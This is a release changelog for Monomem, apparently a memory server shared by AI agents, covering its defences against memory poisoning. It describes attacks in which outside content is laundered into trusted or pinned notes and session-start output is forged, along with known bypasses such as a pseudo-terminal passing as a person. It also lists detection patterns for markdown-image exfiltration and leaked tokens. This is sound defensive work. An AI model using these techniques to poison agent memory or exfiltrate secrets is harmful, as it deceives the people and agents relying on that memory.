# Changelog

All notable changes to this project are documented here. The format is based on
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project aims
to follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [1.4.0] - 2026-11-13

**What this release can't do.** Monomem marks a note as from outside content only when it can see the outside read: a
hook-equipped session (Claude Code) that ran `WebFetch`, `WebSearch` or another MCP server's tool, a connection that read
an unconfirmed note, or a writer that declares it. It does not see `Read`, `Bash` (`curl`, `git pull`), or apps without
Monomem's hooks, so an unmarked note is not thereby safe. It never judges whether text is true. A stated confirm source is a
claim Monomem does not fetch or check, and a second agent's confirm is corroboration, not verification. A local (stdio)
app's confirm never counts, because its name is a config claim. `derived_from` only helps when agents fill it in, and it
looks one hop back. The read signal is per connection and resets when the server restarts. Upgrading hides nothing; about
30 days after the upgrade, notes nobody has touched or confirmed get a `[expired - ...]` label (labels only, unless you
turn on `enforce`). Upgrade notes: docs/upgrading.md (schema v19 to v20, one way, verified backup first).

### Added

- **Notes written after an agent read outside content land unconfirmed.** A note gets a reserved `obs.origin:*` mark
  when Monomem can see one of three things: a hook-equipped session in the same namespace read outside content within
  the last 12 hours and has not ended (`MONOMEM_TAINT_WINDOW_HOURS`, `0` = off); the connection writing it had read an
  unconfirmed note; or the writer declared it (`outside: true` on MCP `state_write`, REST `POST`/`PUT /notes`,
  `monomem add --outside`, or `"reads_outside": true` on a token). The local `monomem` command counts as the person
  only at a real terminal: run from an agent's shell tool or a script (`monomem remember`, `monomem add`), its notes are
  marked like any other writer's. The mark only grows: no update path, import or agent
  write removes it. An unconfirmed note is kept out of session start (text and title; one count line says
  `Monomem: N notes from outside content wait for confirmation (not shown). Review: monomem review`), labelled
  `[unconfirmed - from outside content]` in search and reads, ranked slightly lower (x0.9), and still returned. It is
  never hidden or deleted. Open tasks and handoffs follow the same rule: an unconfirmed one is left off the session-start
  board and counted in the same line. The window is per namespace, so a browsing session can mark a sibling session's
  notes; a person's confirm clears that. Notes that existed before the upgrade are exempt from this hold. See docs/trust.md.
- **Confirming notes.** `monomem confirm <id> [--source "what you checked"]` (asks you to type yes) records who, when
  and against what: `Confirmed "Acme pricing" by cli at 2026-11-13 14:02. Checked against: vendor site. Next check due
  2026-12-13.` Also REST `POST /notes/:id/confirm` (write scope), a **Confirm** button in the dashboard, and the MCP tool
  `memory_confirm` (not in the default tool set; turn it on with `MONOMEM_TOOLS`). A person's confirm always counts. An
  admin key (dashboard, REST) releases the session-start hold. The dashboard opened with `monomem open` may confirm a note
  it has listed; any other key that was handed the note while unconfirmed (the primary admin key included) is refused.
  Another agent counts only with its own key, a different
  writer from the note's, a stated source different from the note's own and from earlier confirms, and only if its
  connection has not read the note while unconfirmed and has not written a note built from it. That is corroboration,
  not verification: a lying agent can still claim a different source. A local (stdio) app's confirm is recorded but
  never counts. A refused confirm names the rule (`Not counted: research-bot wrote this note, so it can't confirm it. A
  person or a different agent must confirm.`). A confirm is bound to the note's version: an edit makes a marked note
  unconfirmed again. Only a confirm at least as strong as the note's current one (person > admin > agent) restarts the
  re-confirmation clock; an agent's corroboration after a person's confirm is recorded and changes nothing, and the reply
  gives the date stored. To an agent the reply names the note by id, not by its title. See docs/trust.md, "Confirming notes".
- **No promotion without a person.** A marked note that no person has confirmed cannot be pinned (CLI, REST
  `PUT /pinned`, dashboard), used as the replacement in a replace, or kept as history over another note. The refusal
  reads `Can't pin: this note came from outside content. A person must confirm it first: monomem confirm <id>`. In a
  terminal, `monomem pin` and `monomem supersede` ask you to type yes and record that as your confirm. An admin key's
  or another agent's confirm does not lift this block. This also applies to notes from before the upgrade that carry a
  1.3.5 outside-content stamp: they stay in session start as before, but pinning one now needs a person. See docs/trust.md.
- **Re-confirmation expiry, label only by default.** A note nobody has changed or confirmed in 30 days gets
  `[expired - not re-confirmed in 30 days]` on reads, search and session-start index lines. It is still shown, ranked as
  before, never archived or deleted. `monomem config set confirm-mode enforce` also keeps expired notes out of session
  start (one count line) and ranks them slightly lower; `confirm-mode off` turns it off (asks you to type yes);
  `monomem config set confirm-days <n>` changes the period (1 to 3650; under `enforce`, shortening it asks you to type yes
  and restarts the clock, so nothing disappears at once). The clock starts at the latest of the last edit,
  a confirm of the current version, the upgrade, and the last mode change. Pinned, replaced, archived and captured rows, tasks and handoffs
  are exempt. No per-tag or per-writer periods yet. See docs/search.md, "Re-confirmation expiry".
- **`monomem review`** lists notes waiting for a person (unconfirmed and expired: id, namespace, title, writer, why).
  `--confirm-all` confirms every listed note as you after one typed yes; `--json` for scripts. Titles go only to your
  terminal, never to session start or an MCP reply.
- **`derived_from`: say what a note was built from.** Optional list of up to 20 note ids on MCP `state_write`, REST
  `POST`/`PUT /notes` and `monomem add --derived-from 3,7`. Links are only ever added. A note built from an unconfirmed
  note is marked as well. A note built from a note a distrusted writer touched is labelled
  `[built on a distrusted writer]` and kept out of session start, but still listed and searchable. It only works when
  agents fill it in, and it looks one hop back. A held write keeps the mark but not its links. See docs/provenance.md.
- **Held-write approval context.** Before you approve a held write, `monomem quarantine show <id>`, the dashboard's Held
  tab, MCP `memory_quarantine action:"context"` and REST `GET /quarantine/:id/context` list the other notes in the same
  namespace saved since it was held that share a title or tag word with it (ids, titles, times, writers; never the held
  text over MCP). It is a simple word match, so it can miss a differently worded correction. A new third choice, **Keep
  as history**, stores the held write with its written time and marks it replaced by the newer note (`supersede undo`
  brings it back); it is offered only when such a note exists. Held edits stay compare-and-swap: if the note changed
  since, approval fails and the write stays queued. See docs/memory-linter.md.
- **Benchmark E21 and E22: laundering outside content into a pinned note.** A trusted writer that rewrites a web page in
  its own words (E21), or an agent that summarises an unconfirmed note it read (E22), gets a note marked as from outside
  content; pinning it is refused until a person confirms it, and its text stays out of session start. Held in our drill:
  `monomem drill` now replays 25 attacks (the same 2 known misses).
- **131 deterministic scenarios** (was 129): A 32, B 31, C 27, D 19, E 22.
- **`monomem doctor` and `monomem health`** print one line per new rule: unconfirmed notes, the expiry mode and how many
  are past due, the outside-content window, and that the read signal is per connection.

### Changed

- **Schema v20.** New columns on notes (`grandfathered_at`, `approved_at`/`approved_by`, `confirmed_*`), on held
  writes (forget date, confidence) and on capture sessions, plus two add-only tables (confirms, derived-from links). A
  verified backup `<database>.pre-v20-backup` is made first; older builds refuse a v20 file. No note text is rewritten,
  and list, search and session start show the same notes right after the upgrade. Records gain the new fields only when
  they are set. See docs/upgrading.md.
- **The 1.3.5 outside-content stamp now applies to every marked note**, not only captured session summaries; summaries
  stamped before the upgrade keep their 1.3.5 treatment (title only at session start). See docs/trust.md.

### Fixed

- **Approving a held write no longer makes it look newer than it is.** Approval used to stamp the approval time, so an
  old claim approved late could outrank a correction saved while it waited. The note now keeps the time the write was
  made; `approved_at` and `approved_by` record the approval. A held edit's time never moves a note backwards. See
  docs/memory-linter.md.
- **A held write no longer drops its forget date and confidence.** Both are kept and applied on approval; the forget date
  counts from the time the write was made. A held edit that clears them (`null`) clears them on approval, and the approval
  view (CLI, dashboard, MCP and REST context) says so.
- **docs/memory-linter.md** said approval kept a held note's creation time. It did not; it does now, and the page says
  exactly what approval keeps.

- **`monomem supersede` and `monomem history` refuse a repeated option** (`--new-id 5 --new-id 9`, `--confirm-token` twice):
  the typed-yes check and the command could read different values. The checks now run inside the command, on the notes it
  acts on, including the notes a `--confirm-token` names.

### Limits found in review, not changed in this release

- Restoring a backup from before the upgrade and upgrading it again marks every note in it as from before the upgrade
  (exempt from the session-start hold) again. That is by design: the notes really are that old.
- `monomem import` (admin) and the foreign, rules and `--claude` imports bring notes in unmarked: the file says nothing
  about where its text came from. Review an imported file before importing it.
- A shell that looks like a terminal counts as a person: the terminal check (stdin and stdout are terminals) is the same
  as for typed-yes commands, and an agent tool that opens a pseudo-terminal passes it.

### Not in this release (planned for 1.4.1)

- Per-tag and per-writer expiry periods, per-namespace `enforce`, and a warning 7 days before notes expire.
- Following `derived_from` more than one hop back, and a session-start count line for notes built on a distrusted writer.
- Any proof that a confirm's stated source differs from the note's (today it is compared as stated, URL by host).
- Per-agent scratchpad namespaces, and `monomem session new` to reset a session's outside-content mark.
- Carrying `derived_from` links through a held write, and `--derived-from` on `monomem edit`.

### Ideas from

- Re-confirmation expiry, and outside content landing unconfirmed: suggested by u/theagenticenterprise on Reddit
  ("Provenance tells you where a note came from. Expiry tells you whether anyone still stands behind it.").
- Held-write approval context, separate written and approved times, and keeping a held write as history: suggested by
  u/AlexWorkGuru.
- `derived_from`: suggested by u/Ctbhatia.
- Session taint and no promotion to rules: from discussion by KolmoPDF, Raju Dandigam and Sammi De Blas in the comments
  on the dev.to drill article.

## [1.3.5] - 2026-11-11

### Added

- **Outside-content stamp on captured session summaries.** When capture distills a Claude Code session that ran
  `WebFetch`, `WebSearch` or another MCP server's tool, the session summary gets the reserved tag
  `obs.origin:tool:<name>` (at most 3, from the hook payload's tool name, never from model text). A stamped summary is named
  but not pasted into the session-start block, index lines say `(session read outside content: WebFetch)`, and the WHO WROTE
  THIS block states it as stamped, not claimed. No update path can drop the stamp (it only grows), an agent's write cannot
  add one, a pinned stamped note shows no text either, and an unsafe or linter-refused tool name is stamped `other`. It is not a clean bill for
  unstamped notes, does not cover an agent paraphrasing outside text into `state_write` (the drill's `SELF` miss) or
  clients without the capture hooks, and does not count `Read`/`Bash`. New `MONOMEM_LOCAL_MCP_SERVERS` names MCP servers
  that only return local content. See docs/trust.md, "The outside-content stamp". Suggested by readers of the drill
  write-up on dev.to.
- **Benchmark E20: a trusted writer that claims its note is its own is still checked.** The write-time linter holds the
  injected note regardless of the claimed source, so the stamp is extra, not what the safety rests on. `monomem drill` now
  replays 23 attacks (the same 2 known misses).
- **129 deterministic scenarios** (was 128): A 32, B 31, C 27, D 19, E 20.

## [1.3.4] - 2026-11-10

### Added

- **Sessions show the model the app reported.** When Claude Code's SessionStart hook includes `model` (it sometimes
  leaves it out, for example after `/clear`), Monomem keeps it on that session and the dashboard's Sessions tab shows
  "Model at session start: … (reported by the app, not verified; subagents and /model switches may differ)". It is not
  stamped on individual notes, never used for access or trust, and no other app reports a model today.

### Fixed (docs)

- **README and INFRA.md no longer say claude.ai or the Claude mobile app can connect.** Their custom connectors sign in
  with OAuth; Monomem only accepts a bearer token, and a login page in front (Cloudflare Access) blocks the connector.
  The docs now say so, link Anthropic's connector-auth page, and point phone users to Claude Code's remote control.

### Added

- **Pinned notes are now also shown first at every session start.** Pin used to mean only "agents can read it, but only
  the monomem CLI can change it". It now ALSO means "shown first at every session start": a `Pinned (always shown):`
  block before everything else, capped at 1600 characters charged to the recall budget. Pinned notes that do not fit
  are counted ("N more pinned notes not shown (monomem pin lists them all, or the dashboard).") and never dropped
  silently. Only the operator pin counts (`monomem pin <id>`, or `PUT /pinned` with an admin key), never the `pinned`
  tag, which still only keeps a captured row from decaying. Distrusted writers, never-show and the sensitivity cap
  apply as before. The dashboard shows **Pin (always shown)** / **Unpin** on each note for an unlimited admin key.
- **New notes from other agents show up on your next message.** The `user-prompt` hook (UserPromptSubmit) now prints
  one title line (id, writer, title; no body) per note saved or changed since your previous message, at most 5 plus
  "and N more", inside the same untrusted-data banner as session start. Captured observations and summaries,
  distrusted writers, never-show notes and this session's own rows are left out (and your own app's notes when the
  hook's environment sets `MONOMEM_CLIENT`). Nothing is printed when there is nothing new, and a busy or missing
  database prints nothing rather than slowing the prompt.

### Changed

- **The dashboard has a new look and plainer words.** A navy header band with the gold rule and the crescent mark (both
  themes), softer cards, a 15px base size, and Calas Automations branding on the sign-in screen and footer. The header
  now holds only search and **+ New**; the project, label and distrusted-writer filters moved to a **Filters** row. Tabs
  are grouped: Notes, Review, Held, Changes first, then Sessions, Quality, Usage, Apps, Activity log. Renamed labels,
  with the technical term in small grey text where it helps: **Meter** is now **Usage** (meter), **Audit** is now
  **Activity log** (audit), the namespace box is **Project** (namespace), the `cli` writer shows as **terminal** (cli),
  **Export JSON** / **Import JSON** are **Download backup** / **Add notes from a backup** (.json), **Change token** is
  **Sign out**, and the sign-in box asks for **Your access key**. An unlimited admin key now sees "You're the owner: you
  can see everything. Agents cannot change pinned notes; only you (terminal or this owner key) can pin or unpin." Delete now confirms with "Confirm permanent
  delete?", and the per-note label picker uses the same honest private wording as the new-note one. No route, element
  id or behaviour changed.

## [1.3.3] - 2026-11-10

### Added

- **The write check's false-positive rate is published.** `node bench/lint-fp.mjs` runs the same check every write goes
  through over 189,502 LongMemEval-S chat turns, LoCoMo-10 and this repo's own docs. It held 21 chat turns (every one
  contains real override wording, chat-template tokens or invisible tag characters) and refused 27, mostly code examples
  with a sample password. Every flagged note was read by hand; results and caveats are in docs/BENCHMARK.md.
- **SECURITY.md: closing the shell gap, strongest first.** A separate OS user owning the data folder (the real boundary),
  a container, and Claude Code deny rules as a copy-paste speed bump, each with what it does not stop.

- **Overdue tasks lead the session-start board.** A task's `due` date was stored but the board never showed it, and it
  listed only the 10 newest open tasks, so a task due last week vanished behind newer ones. The board now looks at up to
  200 open tasks, puts the ones whose due date or time has passed first (earliest first), and prints `due <date>` and
  `OVERDUE` on each line. Every board line also names its server-stamped writer (`[by <writer>]`), so a task from an
  access key never shows up unlabelled. This is not a notification: nothing fires between sessions.

## [1.3.2] - 2026-11-10

### Changed

- **`task_put` now says what it can do.** It carries `destructiveHint: true` (it can queue a command for the runner), so MCP
  apps that ask before risky tools will ask before this one. Its `command.action` field now states the rule the server already
  enforced: an allowlist action name (letters, digits, `. _ : -`, up to 64), never a command line. Nothing about what is accepted
  changed; a security scanner reading the tool's description can now see the limit. `task_put` is still not in the default tool
  set (`MONOMEM_TOOLS=all` or a list naming it turns it on), command tasks still need an admin's approval, and the runner still
  runs only actions on its own allowlist.

## [1.3.1] - 2026-11-09

### Added

- **`monomem-mcp` command.** Starts only the stdio MCP server, with no arguments. `monomem` with no arguments starts the HTTP
  server and dashboard, so a launcher that runs one bare command and cannot pass `mcp` (a catalog or security-tool entry) had no
  way to start the MCP connection. `monomem mcp` keeps working exactly as before.

## [1.3.0] - 2026-11-09

Upgrade notes: the first start migrates the database from schema v18 to v19 (one way: older builds refuse it) after
making `<database>.pre-v19-backup`. To go back, close every app that uses Monomem and run `monomem restore <database>.pre-v19-backup --yes`
(it keeps your current database aside first), then install 1.2.1. Details: `docs/upgrading.md`.

### Fixed

- **The audit log followed the default folder, not the database in use.** With `MONOMEM_DB_PATH` pinned (a second or temporary
  store), every write was logged in the default store's `audit.log`. The log now sits beside the pinned database (`MONOMEM_AUDIT_LOG`
  still wins; `:memory:` keeps the old rule).
- **`setup --yes` left old capture hooks that could no longer run.** Without `--capture`, it replaced only the start-of-session hook;
  the other `npx -y onememory-mcp@x hook <event>` hooks stayed, could not open a v19 database, and capture silently stopped. Rewriting
  hooks that are already installed is an upgrade, not a new opt-in, so setup now does it (listed in the plan); `--no-capture` leaves
  them and warns.
- **`setup` ignored `ONEMEMORY_DB_PATH` / `ONEMEMORY_HOME` set in the shell** in some paths. Old-style names now count as `MONOMEM_*`
  everywhere in setup, as at run time.
- **`setup` deleted notes it had not written.** Its test-note step also deleted every note tagged `setup-check` that an earlier
  installer had left (for example a pinned "OneMemory is connected" note #1). On a store where that note was pinned, the delete was
  refused and setup stopped with "the database could not be opened". Setup now deletes only the one test note it wrote in the same
  run, by its id; older installer notes are left as they are (not deleted, archived or unpinned) and named in one line with how to
  archive them yourself (`monomem forget <id>`). The plan line no longer claims "your store is left empty".
- **Claude Desktop from the Microsoft Store (MSIX) was not found.** Its config lives at
  `%LOCALAPPDATA%\Packages\Claude_*\LocalCache\Roaming\Claude\claude_desktop_config.json`. Setup now looks there too (beside the
  usual `%APPDATA%\Claude` file), shows it as "Claude Desktop (Microsoft Store)", and treats a `monomem` entry in it like any other
  app's (labelled, pinned to the data folder, backup and undo as usual). Only checked against a simulated folder layout, not a
  real Store install.
- **Codex: an old `[mcp_servers.onememory]` table got a second server beside it.** It is now replaced by `[mcp_servers.monomem]`
  with the same data settings (`ONEMEMORY_*` env renamed to `MONOMEM_*`), with a backup and `setup --undo` restoring the exact bytes.
  An inline `onememory = { ... }`, or an `onememory` table beside an existing `monomem` one, is not edited: setup says what to remove.
- **The merge hint for two stores that both hold notes pointed the wrong way.** It said to import the old entry's store into the
  `monomem` one whatever their sizes, so a 3-note store could be told to absorb an 800-note one. It now names both stores with their
  note counts, keeps the larger one as the main data and imports the smaller one into it, and says to delete the smaller one's entry.
- **The `claude-bridge` import hint named the wrong database** when a database was pinned in the shell (`MONOMEM_DB_PATH` or `--db`):
  it showed the pinned store and its count instead of claude-bridge's own. It now names claude-bridge's own database.

- **`setup` on an upgrade from OneMemory kept pointing apps at an empty store.** When the notes are in `~/.onememory/state.db`
  and there is no `~/.monomem/state.db` (the folder the server already falls back to), setup planned the migrated entry on the empty
  `~/.monomem` and judged the old entry by that empty folder. It now uses the same rule as the server (one shared function), says so
  in the plan, and writes `MONOMEM_HOME=<home>/.onememory` into each app entry and `--db` into each hook, so the notes stay reachable
  even after something creates `~/.monomem/state.db`.
- **An old `claude-bridge` entry with its own database is no longer made the main store** when an `onememory` or `monomem` entry is
  beside it (before, the one with notes won, and the `onememory` entry was removed). It is left exactly as it is, and setup prints one
  line on how to bring its notes over (`monomem export --format json` from a copy, then `monomem import --file`). A `claude-bridge`
  entry on its own is still migrated as before.
- **`monomem` beside `onememory` on different databases:** when the old entry has notes and the `monomem` one has none, the plan
  shows the empty `monomem` entry being replaced by the old one with its data, and it is applied only after a typed yes (not with
  `--yes` alone). When both have notes, setup stops, changes nothing and prints the commands that merge them. Same data, or an empty
  old entry: unchanged (remove the old entry, asked first).
- **Old hooks are replaced, not left or duplicated:** `npx -y onememory-mcp[@x] hook <event>` (and an npx `monomem@<other version>`
  or `monomem@latest`) is rewritten in place for every automatic-memory event, not only the start-of-session one, and a rewritten
  start-of-session entry moves from `startup|clear` to `startup|clear|compact`.
- **Hooks run the installed copy:** when setup runs from npx and the same version is installed globally, every hook (not only the
  prompt and Read ones) runs `node <global cli.js>`; without a global copy they stay on `npx -y monomem@<this version>`.

### Security

- **Capture redacts bare random tokens.** The capture hooks stored a bare 32-character hex key (e.g. the output of `cat .token`)
  as it was, because it has no prefix, no `name=` before it and, being hex, no mixed case. Now redacted as `[REDACTED:random token]`:
  any standalone run of 32+ hex digits (one case, with a digit and a letter) except exactly 40, and any base62/base64url token of 32+
  characters with upper, lower and digits that flips case at least every 4 characters and has >= 4.3 bits/char of entropy. Kept:
  git object ids (exactly 40 hex), short SHAs and anything under 32 hex, digests written `sha1:`/`sha256:`/`sha384:`/`sha512:` (or
  with `=`/`-`), UUIDs, plain numbers, identifiers and joined words, paths. Known cost: other unprefixed 32+ hex ids (an MD5 checksum,
  a 64-hex docker container id) are redacted too. This is capture only; the note linter's rules are unchanged.

- **Rate-limit key behind a proxy:** with `MONOMEM_TRUST_PROXY=1` the bucket is the rightmost `X-Forwarded-For` entry (the one your
  proxy appended), not the leftmost one, which the client controls: a client could get a fresh bucket for every forged value.
  `MONOMEM_TRUST_PROXY_HOPS=N` (default 1) picks the Nth entry from the right (the leftmost one if there are fewer). No change when
  `MONOMEM_TRUST_PROXY` is unset.
- **Secret guard:** refuses a note that contains one of this server's own access tokens verbatim (the main token and every
  `tokens.json` / `MONOMEM_TOKENS` entry; the message never shows the value), so the snippet `POST /tokens` prints cannot be saved as a
  note. Also refused now: `token` / `access_token` / `auth_token` / `bearer` written with a value of 16+ characters that has a digit
  (`MONOMEM_TOKEN=<64 hex>`, `{"token":"..."}`), a literal `Authorization: Bearer <20+ chars>`, a password in a URL
  (`postgres://user:pw@host`; placeholders such as `<password>` or `$PW` pass), Slack and Discord webhook URLs, Hugging Face `hf_`
  tokens and Azure `AccountKey=` values. `token: <your token here>`, `Bearer $TOKEN`, `max_tokens: 4096` and `postgres://localhost/app`
  still pass.
- **Markdown exfiltration rule** also covers `<img src="https://host/p?x=...">` and reference-style images (`![x][ref]` with a
  `[ref]: https://host/p?x=...` line). Badge hosts stay exempt; a reference used only by plain links still passes.
- **Audit log:** making and removing an app token (`monomem token add|remove`, the dashboard, `POST /tokens`, `DELETE /tokens/<name>`)
  writes `token.add` / `token.remove` with the caller's label and the new token's name, scope, namespace and limit (never the token).
  `GET /export` and `monomem export` write `export` with the note count and flags.
- **`POST /tokens`** with `admin: true` or `no_limit: true` now needs the main (`primary`) token; any other admin gets 403. The CLI is
  unchanged.
- A failed audit write still never fails a request, but it is no longer silent: it is counted (`audit_failures` in `GET /stats`), printed
  to stderr on the first failure and every 1000th, and `monomem health` warns when the audit log cannot be written or this process
  failed to write an entry.
- **Session-start context:** each line starts with the server-stamped writer (`- webagent (token): [title] ...`, index lines
  `#12 by webagent: [note] title (...)`), so a title can no longer print a fake "(written by cli)" ahead of the real writer; `[` and `]`
  in a title print as `(` and `)`, and a title is one line. The opening notice and the closing "END OF STORED NOTES" line carry the same
  random block id, new for each output, so a note that copies the old closing line does not match the real one. `monomem drill` checks
  both (FORGE, TERM), so it now reports 22 attacks instead of 20.
- **Names a terminal could misprint are refused:** a namespace or tag with a control, line-separator or text-direction character
  (anything `printable()` would replace) is refused on every write path (notes, tasks, handoffs: `Store.create` / `update`), as is
  a namespace over 100 characters and the namespace `*`. Imports (`import --file` and admin `POST /import`) apply the same rule:
  each such row is listed in the report's `rejected` with the reason and the rest of the file is imported. A database-file restore
  (`monomem restore <backup>`) copies the file as it is. For rows already stored, `monomem audit`, `ls`, `show`, `search` and the other note listings print namespace, label and tags through
  `printable()`. JSON responses (and the `/export` stream) carry `Cache-Control: no-store` and `X-Content-Type-Options: nosniff`.
- **Two app tokens with the same name are refused.** Tokens whose labels match after cleaning (letter case and spacing aside; two
  unnamed tokens count too) would stamp the same `written_by`, so both stop working and the server says so on stderr (doctor and
  health show that line too) until one is renamed. **Check `MONOMEM_TOKENS` / `tokens.json` for unnamed tokens before upgrading.**
- **Stdio with `MONOMEM_STDIO_MAX_SENSITIVITY`:** writes are stamped `stdio:<app>` again; with the ceiling set they were stamped
  plain `stdio`.
- **`POST /capture`:** a session remembers the writer that opened it (new nullable `sessions.writer` column, filled for new sessions
  only); another writer posting to it gets 409, so it cannot add events or end the session with its own summary.
- **Session-start notes:** the opening notice now says that the closing line carries the same block id. The drill's TERM check now
  uses a note that knows this output's block id and checks that no printed line equals the real closing line.
- **Backdating needs admin:** `POST /notes` with `created_at` from a non-admin key gets 400 (nothing is stored). Admin keys, imports
  and consolidation may still set it, but a `created_at` more than 5 minutes in the future is refused (an import lists that row in
  `rejected`).
- **A forget date on someone else's note needs admin:** a non-admin key may set a non-zero `forget_after` only on a note whose
  `created_by` is its own (editing a note does not make it yours); otherwise the update is refused with the same "lacks the required 'admin' scope" message `state_delete`
  gives. This applies in every namespace. The CLI, stdio and admin keys are not limited. `forget_after: 0` stays allowed.
- **Expiry sweep audit:** `sweep-expire` is written once per archived note (its id, namespace and the note's last writer as
  `last written by <name>`; who set the deadline is not stored), instead of one line with a count.
- **Strict ids in MCP tools:** an id is accepted as a number or a digit-only string (`"5"`). `true`, `null`, `""` and `[5]` are
  validation errors; before, they became 1, 0, 0 and 5, so `state_delete {"id": true}` archived note 1.
- **Sync: notes written on another machine are claims, not trusted writes.** A file `import --dir` or `sync` reads whose `origin`
  is another store now creates or updates its note with `imported_unverified` set (so `why` and the provenance banner say it came
  in without a verified attestation), and in an approve-first namespace that create or update goes to quarantine like an agent's
  write instead of going live. The summary adds "N note(s) from other machines held for review". Approving one applies it as the
  approver (`cli`) and keeps the `imported_unverified` flag; an approved create is linked to the file's origin, so the next sync
  updates that note instead of adding a second copy. Approving a held create or update also records it as what this store last
  synced, so an edit the other machine makes before the next sync here arrives as an update (it was skipped as "store has a newer
  version", or an approved update turned the next edit into a false conflict). If the file is edited again before anyone approves
  the held create, the next sync replaces the held copy instead of holding a second one (approving both made two notes). Files
  this store wrote merge as before.
- **A forget date on someone else's note** now checks `created_by` (the note's first writer), not `written_by`: editing another
  writer's note no longer makes it yours.
- **A namespace that looks like a known secret** (an AWS key, a GitHub token and the other known-prefix patterns; no entropy
  check) is refused on every write path, the import paths included, before anything is written or audited. The message names the
  kind of secret, never the value.
- **Runner child environment:** also drops variables whose names match `_AUTH`, `PWD` at the end, `DSN`, `CONNECTION_STRING`,
  `SSH_AUTH_SOCK`, `GPG_AGENT`, and `MONOMEM_HOME` / `ONEMEMORY_HOME`, and any variable whose value is a URL with a password
  (`scheme://user:pass@...`). docs/RUNNER.md now says plainly that a command runs as the same user and can read the data folder,
  `.token` included.
- **`MONOMEM_RATE_MAX`, `MONOMEM_RATE_WINDOW_MS`, `MONOMEM_TARPIT_STEP_MS`, `MONOMEM_TARPIT_CAP_MS`** that are not a whole number
  >= 0 fall back to the default with one stderr line (before, `abc` became NaN and switched the limit off). Same check as the
  server-limit variables, now shared (`envNum` in config.ts).
- **`monomem start` on a non-loopback bind** prints one stderr warning that the API is plain HTTP and points to INFRA.md (doctor
  already showed a `[warn]` line for it; a test now checks that line).
- **Session-start git signals** run git with `-c core.fsmonitor=false -c core.hooksPath=`, and the diff with `--no-ext-diff`, so a
  repository's own config cannot make that read run a program.
- **`uninstall --purge` never deletes files that are not Monomem's.** It compares the data folder's top-level entries with the names
  Monomem writes (the database and its side files, keys, tokens, audit log, capture spool, setup history, runner and sync state,
  backups); if anything else is there it deletes only Monomem's entries, keeps the folder, and says how many other files it left.
  The plan says the same before you confirm. It refuses outright when the data folder is your home folder or a drive root.

### Fixed

- **`monomem changes --since last`** prints every page again and moves its marker. With more changes than `--limit` it printed
  one page and left the marker where it was, so the same changes came back every run. Other `--since` values still print one page
  and the "more" line.
- **Setup with several old entries:** an `onememory` entry's `ONEMEMORY_DB_PATH` / `ONEMEMORY_HOME` now count when choosing which
  entry keeps its data (they were ignored, so an empty `claude-bridge` entry could win and the onememory notes were left unused),
  and the new entry carries them as `MONOMEM_DB_PATH` / `MONOMEM_HOME`. An entry with `MONOMEM_HOME` is judged by that folder's
  database, with one pair of quotes removed as at run time (a quoted value counted 0 notes, so the empty `claude-bridge` entry
  could still win). A relative `MONOMEM_HOME` is still judged against setup's own folder.
- **`monomem restore`** works on a damaged database (it is moved aside as-is, with its `-wal` / `-shm`, instead of failing on the
  checkpoint) and refuses while another program has the database open even when idle (it tests the database lock; it no longer refuses
  just because something answers on the API port). A file another program holds gives the "close the apps" message, never a stack
  trace, and no `.restore-*.tmp` is left behind. The "To go back" line quotes the path. The damaged-database message points to
  `monomem restore <backup folder>`.
- **Help:** `monomem --help` and `-h` print the same as `monomem help`; `monomem help <command>` is the same as `monomem <command> --help`;
  `ls`, `edit`, `forget` and `unpin --help` show their own line; `monomem hook --help` prints help instead of running a hook; the unknown
  hook event message lists `file-context`. `doctor`'s verdict points at the `[warn]` lines. INSTALL.md said ten default tools; there are
  nine.
- **Setup:** a `MONOMEM_HOME` that is not `~/.monomem` is written into every app entry setup or connect writes (as `MONOMEM_DB_PATH`
  already was), and setup says so; before, the app used `~/.monomem`. Claude Code's start-of-session hook also runs after `/compact`
  (matcher `startup|clear|compact`, in setup and the plugin's `hooks/hooks.json`); running setup again replaces a `startup|clear` entry
  it wrote earlier (the new one goes at the end of the SessionStart list; no second entry). Re-printing costs one more recall block per compaction. `init` says `monomem uninstall` reverses every app
  and `setup --undo` only the last run.
- **`monomem edit`:** a missing note is reported before anything else; with no `VISUAL` / `EDITOR` it opens `notepad` on Windows and
  `vi` elsewhere; the file path is quoted, so a temp folder with a space works and Node prints no DEP0190 warning.
- **Agent-facing text names only tools a default install has:** the file-context hook says `state_read id=N` unless `memory_get` is
  enabled; the snippet and the habits skill say `state_search` (add mode: "relevant") instead of `state_relevant`; `catch_up`'s
  description mentions `task_get`, `memory_since` and `memory_ack` only when they are enabled.

- **Setup and `MONOMEM_HOME`:** with `MONOMEM_HOME` set and no `--db`, the session-start and capture hooks get
  `--db "<home>/state.db"`, so they use the same notes as the app entry (before, they used `~/.monomem`). An existing `monomem`
  entry that names no data folder gets `MONOMEM_HOME` (and `MONOMEM_DB_PATH` with `--db`) added, and `--undo` takes it out again;
  one that names a different folder stops setup with a conflict instead of "already set up". Codex's TOML entry gets the same, or a
  by-hand hint when its env is written inline. `MONOMEM_HOME=~/x` (or `~\x`) means the home folder; a relative path still works but
  prints a warning, and doctor warns too.
- **`monomem connect windsurf`** prints the real launch command (the same one setup writes) with `MONOMEM_CLIENT=windsurf` and, when
  set, `MONOMEM_HOME`, instead of `{"command":"monomem"}`. `connect --dry-run` no longer says "Connected"; it says to run the same
  command without `--dry-run`. `connect --name <label>` sets the restricted key's label (it was in the help but refused); the help
  lists `--max`, `--print`, `--dry-run` and `--yes`.
- **`monomem backup`** with `MONOMEM_HOME` set and no `--out` writes `monomem-backup-<time>` next to that data folder instead of
  into the real home folder.
- **`monomem edit`** always deletes its temporary copy of the note, also when the editor fails, the title is empty, or the change is
  refused or held (same exit codes as before).
- **A damaged database is reported, not shown as "no notes".** A search error that is not a query-syntax problem (a damaged file,
  for example) is raised instead of returning no results, and any command that hits one prints what happened and how to restore
  (`monomem restore`). `monomem doctor` and `monomem health` run `PRAGMA quick_check(1)` and the FTS5 index's integrity-check
  (structure only), and report a fail line with the same advice. Health runs each count on its own, so one that fails is a warning
  of its own instead of stopping the rest; with a damaged file it no longer runs the drill.
- **`monomem health`'s audit check** looks for the line it saw last time anywhere in the log, so new lines and a rotation
  (`MONOMEM_AUDIT_MAX_BYTES` / `MONOMEM_AUDIT_KEEP`) are not reported as tampering: when that line has rotated out it says so (it
  then cannot tell rotation from removal). `monomem backup` leaves health's remembered line out of the copy and `monomem restore`
  clears it. The audit-write check counts only this process's failed audit entries (a running server reports its own in
  `GET /stats` `audit_failures`); it now has a test.
- **Session-start notes:** the closing hint says `Open any with state_read id=N` (as the file-context hook does) unless
